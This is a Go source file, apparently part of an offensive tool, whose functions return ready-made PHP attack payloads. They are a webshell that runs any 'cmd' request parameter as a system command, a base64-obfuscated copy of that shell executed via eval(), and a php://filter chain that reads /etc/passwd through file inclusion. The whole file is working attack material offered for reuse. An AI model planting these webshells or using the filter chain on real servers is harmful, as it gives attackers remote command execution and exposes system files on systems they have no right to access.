package payloads

// PHPWebshell returns a basic PHP webshell.
func PHPWebshell() string {
	return `<?php if(isset($_REQUEST['cmd'])){ $cmd=($_REQUEST['cmd']); system($cmd); } ?>`
}

// PHPBase64Webshell returns a base64-obfuscated PHP webshell.
func PHPBase64Webshell() string {
	return `<?php eval(base64_decode("aWYoaXNzZXQoJF9SRVFVRVNUW2NtZF0pKXsgJGNtZD0oJF9SRVFVRVNUW2NtZF0pOyBzeXN0ZW0oJGNtZCk7IH0=")); ?>`
}

// PHPFilterChain returns a PHP filter chain payload for PHP 8.x.
func PHPFilterChain() string {
	return `php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7/resource=/etc/passwd`
}
